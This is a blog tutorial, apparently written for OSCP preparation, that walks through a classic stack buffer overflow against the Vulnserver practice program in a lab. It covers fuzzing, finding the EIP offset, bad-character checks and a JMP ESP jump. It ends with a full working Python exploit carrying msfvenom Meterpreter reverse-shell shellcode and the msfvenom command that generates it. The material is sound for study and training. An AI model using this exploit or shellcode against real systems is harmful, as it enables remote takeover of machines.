---
layout: post
title: "Stack Based Buffer Overflows Part 1"
---

## What is a Buffer Overflow?

A buffer overflow is when an application attempts to write more data in a buffer than expected or when an application attempts to write more data in a memory area past a buffer. A buffer is a sequential section of memory that is allocated to contain anything from strings to integers. Going past the memory area of the allocated block can crash the program, corrupt data and even execute malicious code.

Here we will be discussing a classic buffer overflow without any memory protections such as DEP or ASLR. Bypassing DEP and ASLR will be addressed in the upcoming blogs.


## Objective
The objective in any buffer overflow, to get remote code execution, is controlling the EIP register (x86 or 32 bit). The EIP register is the instruction pointer which tells the CPU to execute the instructions it's pointing at. Once we have control of this register, we can redirect the execution flow of the program to our liking, which can be malicious shellcode that sends a connection back aka reverse shell. However, many problems can be faced during this objective.



Let's start with a quick nmap scan.

Here we can see port 9999 is open on the target IP address

![screenshot1](/images/2020-01-25-Stack-Based-Buffer-Overflows-Part-1/screenshot1.png)


Using netcat, we connect to the target and use the HELP option

![screenshot2](/images/2020-01-25-Stack-Based-Buffer-Overflows-Part-1/screenshot2.png)



## Fuzzing

Fuzzing is sending a large amount of buffer with malformed data into the user input field and observe the application for unexpected crashes.

There are many fuzzers out there, but for this example, we will be using Spike. After fuzzing many parameters, we find that the TRUN command is vulnerable to a buffer overflow.

Here is the template that caused the crash:
```
s_readline();
s_string("TRUN ");
s_string_variable("COMMAND");
```

To start fuzzing with Spike, we used the following:
```
generic_send_tcp 192.168.81.129 9999 fuzz.spk 0 0
```

![](/images/2020-01-25-Stack-Based-Buffer-Overflows-Part-1/screenshot3.png)



Before we started fuzzing the application was attached to Immunity debugger, as you can see the application crashed and we overwrote the EIP register with 4 A's (41414141) this is also known as a vanilla EIP overwrite.

![](/images/2020-01-25-Stack-Based-Buffer-Overflows-Part-1/screenshot4.png)


After observing tcpdump/wireshark traffic, we noticed which sequence of characters caused the crash, let's make an exploit to automate this process.



## Crash Replication

Here we make a small python exploit to replicate the crash and overwrite the EIP register. We send `TRUN /.:/` and 3000 A's which is the payload the crashes the application, you can confrim this by looking at the tcpdump/wireshark output while fuzzing.

```python
import socket

# Target IP address and port
RHOST = "192.168.81.129"
RPORT = 9999

payload = "TRUN /.:/"
payload += "A" * 3000

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("\n[+] Sending evil buffer...")
    s.connect((RHOST, RPORT))
    s.recv(1024)
    s.send(payload)
    print("[+] Evil buffer sent...")
except:
    print("[-] Could not connect to server!")

```

As you can see, we have overwritten the EIP registers with our exploit and the application has crashed.

Note: "Access Violation"

![](/images/2020-01-25-Stack-Based-Buffer-Overflows-Part-1/screenshot4.png)


## Controlling EIP

To control EIP, we need to find at which offset the EIP register is overwritten. We can use Metasploit's pattern create to create a pattern of 3000 bytes and then locating the offset.


![](/images/2020-01-25-Stack-Based-Buffer-Overflows-Part-1/screenshot5.png)

Here is the exploit which will send a unique pattern of 3000 bytes.

```python
import socket

# Target IP address and port
RHOST = "192.168.81.129"
RPORT = 9999

#Evil Buffer
pattern = ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9")

payload = "TRUN /.:/"
#payload += "A" * 3000
payload += pattern


try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("\n[+] Sending evil buffer...")
    s.connect((RHOST, RPORT))
    s.recv(1024)
    s.send(payload)
    print("[+] Evil buffer sent...")
except:
    print("[-] Could not connect to server!")

```


After sending the exploit we can see the EIP register points to `386F4337`

![](/images/2020-01-25-Stack-Based-Buffer-Overflows-Part-1/screenshot6.png)

We can now locate the offset, which is at `2003`. This means that after 2003 bytes the EIP register the overwritten.

![](/images/2020-01-25-Stack-Based-Buffer-Overflows-Part-1/screenshot7.png)



Lets test that theory, we will overwrite our register with 4 B's and the rest of the buffer will have C's after it.

Here is the exploit used that sends a buffer with 2003 A's which is the offset that we found, 4 B's which will hopefully overwrite EIP and rest of the buffer with C's as padding.

```python
import socket

# Target IP address and port
RHOST = "192.168.81.129"
RPORT = 9999

payload = "TRUN /.:/"
payload += "A" * 2003 + "B" * 4 + "C" * (3000 - 2003 - 4)

print(len(payload))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("\n[+] Sending evil buffer...")
    s.connect((RHOST, RPORT))
    s.recv(1024)
    s.send(payload)
    print("[+] Evil buffer sent...")
except:
    print("[-] Could not connect to server!")

```

Perfect! Our EIP register is cleanly overwritten with 4 B's and even better our ESP register points to our C's, which is right after our B's

![](/images/2020-01-25-Stack-Based-Buffer-Overflows-Part-1/screenshot8.png)



## Locating Space for Your Shellcode

As shown in the previous screenshot, we can see that our ESP register point towards our C's, which is more than enough space for our shellcode. A standard reverse shell takes anywhere between 350 to 400 bytes of space.


## Checking for Bad Characters

Depending on the application, vulnerability type and protocols in use, there may be certain characters that can truncate our buffer, which are considered to be bad chars.

An example of a very common bad character (especially in
buffer overflows caused by unchecked string copy operations) is the null byte (0x00).

0x00 is considered a bad because a null byte is also used to terminate a string
copy operation, which would effectively truncate our buffer to wherever the first null
byte appears.

The reason we want to get rid of bad chars is that when we generate our reverse shell using msfvenom we can luckily say which char is a bad one and msfvenom will get rid of it.


We can use mona to generate a byte array from 00 to FF and send this payload in our exploit instead of our C's. To demonstrate how the buffer is truncated I will include the bad char \x00 


![](/images/2020-01-25-Stack-Based-Buffer-Overflows-Part-1/screenshot10.png)


Let's see this in action.

```python
import socket

# Target IP address and port
RHOST = "192.168.81.129"
RPORT = 9999

badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = "TRUN /.:/"
payload += "A" * 2003 + "B" * 4 + badchars + "C" * (3000 - 2003 - 4 - len(badchars))

print(len(payload))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("\n[+] Sending evil buffer...")
    s.connect((RHOST, RPORT))
    s.recv(1024)
    s.send(payload)
    print("[+] Evil buffer sent...")
except:
    print("[-] Could not connect to server!")

```

As you can see, our entire buffer is truncated after our 4 B's, which means that \x00 is a bad char.

![](/images/2020-01-25-Stack-Based-Buffer-Overflows-Part-1/screenshot11.png)

Now, let's remove `\x00` and test for any other bad characters, this process can take sometime depending on the how many bad characters there are, trial and error is the only way as far as I'm aware.

```python
import socket

# Target IP address and port
RHOST = "192.168.81.129"
RPORT = 9999

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = "TRUN /.:/"
payload += "A" * 2003 + "B" * 4 + badchars + "C" * (3000 - 2003 - 4 - len(badchars))

print(len(payload))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("\n[+] Sending evil buffer...")
    s.connect((RHOST, RPORT))
    s.recv(1024)
    s.send(payload)
    print("[+] Evil buffer sent...")
except:
    print("[-] Could not connect to server!")
```



As you can see, there are no more bad chars.

![](/images/2020-01-25-Stack-Based-Buffer-Overflows-Part-1/screenshot12.png)


## Redirecting Execution Flow

So we control the EIP register and have identified the bad characters, we can also see that ESP points to our C's which is where we can place our shellcode for a reverse shell.

The best thing to do would be to try and replace the B's that overwrite EIP with the address that pops up in the ESP register at the time of the crash. However, the value in the ESP register changes from crash to crash. This is why we can not hardcode the value.


The best way to go about this is to locate a reliable address in memory that contains an instruction such as JMP ESP. Then we can jump to it and end up at the address pointed to by the ESP register; the cool thing is we have mona.py which is an immunity debugger script to find this address for us.

We need to search for a module which meets the following criteria:

* Has no memory protections such as DEP or ASLR 
* Does not have any bad characters.


Let's run `!mona modules`

We can instantly see there is a module that meets our criteria which is `essfunc.dll`. We also have vulnserver.exe but it is loaded at a very low address values, starting with 0x00, so any reference to addresses within vulnserver.exe will require a null byte, and that won't work because '\x00' is a bad character.


![](/images/2020-01-25-Stack-Based-Buffer-Overflows-Part-1/screenshot13.png)


Lets search for JMP ESP in the module `essfunc.dll`, note that `\xff\xe4` is the JMP ESP instruction.

`!mona find -s "\xff\xe4" -m essfunc.dll`



We can see that there are many occurrences of JMP ESP. However, we will just take the first one `0x625011AF`


![](/images/2020-01-25-Stack-Based-Buffer-Overflows-Part-1/screenshot14.png)


Lets test this JMP ESP

```python
import socket

# Target IP address and port
RHOST = "192.168.81.129"
RPORT = 9999

#JMP ESP 0x625011AF: \xAF\x11\x50\x62
payload = "TRUN /.:/" 
#payload += "A" * 2003 + "B" * 4 + "C" * (3000 - 2003 - 4)
payload += "A" * 2003 + "\xAF\x11\x50\x62" + "C" * (3000 - 2003 - 4)

print(len(payload))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("\n[+] Sending evil buffer...")
    s.connect((RHOST, RPORT))
    s.recv(1024)
    s.send(payload)
    print("[+] Evil buffer sent...")
except:
    print("[-] Could not connect to server!")

```

As you can see our ESP register points towards the start of our C's everytime, even from crash to crash, which is a perfect place to put our shellcode for a reverse shell.

![](/images/2020-01-25-Stack-Based-Buffer-Overflows-Part-1/screenshot15.png)



## Generating Shellcode with Metasploit

Let's generate a reverse Meterpreter shell, don't forget to specify the bad chars.

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.81.128 LPORT=443 -b "\x00" x86/shikata_ga_nai -f python`



![](/images/2020-01-25-Stack-Based-Buffer-Overflows-Part-1/screenshot16.png)



Here we start the Metasploit's multi handler to catch a staged Meterpreter shell.

![](/images/2020-01-25-Stack-Based-Buffer-Overflows-Part-1/screenshot17.png)


## Getting a Shell

NOP's are "No Operation" instructions/commands/characters that tell CPU to do nothing and go on to the next instruction

We want to pad our buffer with \x90's which are memN0ps ;) get it? Rekt! jks :P

The reason we do this is because the Metasploit Framework decoder will step on it's toes, by overwriting the first few bytes of our shellcode. We can prevent this by adding a "NOPSLED" at the start of our shellcode so it will smoothly slide into our shellcode.

Full working POC:

```python
import socket

# Target IP address and port
RHOST = "192.168.81.129"
RPORT = 9999

buf = b""
buf += b"\xbd\xae\x67\x2c\x96\xda\xde\xd9\x74\x24\xf4\x5e\x29"
buf += b"\xc9\xb1\x56\x31\x6e\x13\x83\xc6\x04\x03\x6e\xa1\x85"
buf += b"\xd9\x6a\x55\xcb\x22\x93\xa5\xac\xab\x76\x94\xec\xc8"
buf += b"\xf3\x86\xdc\x9b\x56\x2a\x96\xce\x42\xb9\xda\xc6\x65"
buf += b"\x0a\x50\x31\x4b\x8b\xc9\x01\xca\x0f\x10\x56\x2c\x2e"
buf += b"\xdb\xab\x2d\x77\x06\x41\x7f\x20\x4c\xf4\x90\x45\x18"
buf += b"\xc5\x1b\x15\x8c\x4d\xff\xed\xaf\x7c\xae\x66\xf6\x5e"
buf += b"\x50\xab\x82\xd6\x4a\xa8\xaf\xa1\xe1\x1a\x5b\x30\x20"
buf += b"\x53\xa4\x9f\x0d\x5c\x57\xe1\x4a\x5a\x88\x94\xa2\x99"
buf += b"\x35\xaf\x70\xe0\xe1\x3a\x63\x42\x61\x9c\x4f\x73\xa6"
buf += b"\x7b\x1b\x7f\x03\x0f\x43\x63\x92\xdc\xff\x9f\x1f\xe3"
buf += b"\x2f\x16\x5b\xc0\xeb\x73\x3f\x69\xad\xd9\xee\x96\xad"
buf += b"\x82\x4f\x33\xa5\x2e\x9b\x4e\xe4\x26\x68\x63\x17\xb6"
buf += b"\xe6\xf4\x64\x84\xa9\xae\xe2\xa4\x22\x69\xf4\xbd\x25"
buf += b"\x8a\x2a\x05\x25\x74\xcb\x75\x6f\xb3\x9f\x25\x07\x12"
buf += b"\xa0\xae\xd7\x9b\x75\x5a\xd2\x0b\xb6\x32\xb3\x4b\x5e"
buf += b"\x40\x34\x4d\x24\xcd\xd2\x1d\x0a\x9d\x4a\xde\xfa\x5d"
buf += b"\x3b\xb6\x10\x52\x64\xa6\x1a\xb9\x0d\x4d\xf5\x17\x65"
buf += b"\xfa\x6c\x32\xfd\x9b\x71\xe9\x7b\x9b\xfa\x1b\x7b\x52"
buf += b"\x0b\x6e\x6f\x83\x6c\x90\x6f\x54\x19\x90\x05\x50\x8b"
buf += b"\xc7\xb1\x5a\xea\x2f\x1e\xa4\xd9\x2c\x59\x5a\x9c\x04"
buf += b"\x11\x6d\x0a\x28\x4d\x92\xda\xa8\x8d\xc4\xb0\xa8\xe5"
buf += b"\xb0\xe0\xfb\x10\xbf\x3c\x68\x89\x2a\xbf\xd8\x7d\xfc"
buf += b"\xd7\xe6\x58\xca\x77\x19\x8f\x48\x7f\xe5\x4d\x67\xd8"
buf += b"\x8d\xad\x37\xd8\x4d\xc4\xb7\x88\x25\x13\x97\x27\x85"
buf += b"\xdc\x32\x60\x8d\x57\xd3\xc2\x2c\x67\xfe\x83\xf0\x68"
buf += b"\x0d\x18\x03\x12\x7e\x9f\xe4\xe3\x96\xc4\xe5\xe3\x96"
buf += b"\xfa\xda\x35\xaf\x88\x1d\x86\x94\x83\x28\xab\xbd\x09"
buf += b"\x52\xff\xbe\x1b"

#JMP ESP 0x625011AF: \xAF\x11\x50\x62
payload = "TRUN /.:/"
#payload += "A" * 2003 + "B" * 4 + "C" * (3000 - 2003 - 4)
payload += "A" * 2003 + "\xAF\x11\x50\x62" + "\x90" * 8 + buf + "C" * (3000 - 2003 - 4 - 8 - len(buf))

print(len(payload))

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("\n[+] Sending evil buffer...")
    s.connect((RHOST, RPORT))
    s.recv(1024)
    s.send(payload)
    print("[+] Evil buffer sent...")
except:
    print("[-] Could not connect to server!")
```

Reverse Meterpreter shell W00TW00T!

![](/images/2020-01-25-Stack-Based-Buffer-Overflows-Part-1/screenshot18.png)


Note: Don't ask me why I redacted the IP's from some image and left it in the code. I have no idea either lol. Maybe I was testing out my redaction tool, I guess.

Hope you enjoyed my blog, there are many blogs out there that do a much better job than I do. I did this like 2 years ago during my time for OSCP and OSCE but wanted to contribute my knowledge which I did not get time for back then. I believe I could've done a better job explaining things if I spent more time on this. Please google what you don't understand, as I said my blog is not that great there are so many good blogs out there.


## Coming Next 

* Structured Exception Handler (SEH)
* Egghunter
* ASLR
* DEP



## References: 

* http://www.thegreycorner.com/p/vulnserver.html
* https://github.com/stephenbradshaw/vulnserver
* https://www.corelan.be/
* https://www.fuzzysecurity.com/
* https://h0mbre.github.io/
* https://sh3llc0d3r.com/
* https://medium.com/bugbountywriteup/windows-based-exploitation-vulnserver-trun-command-buffer-overflow-707faa669b4c
* https://www.offensive-security.com/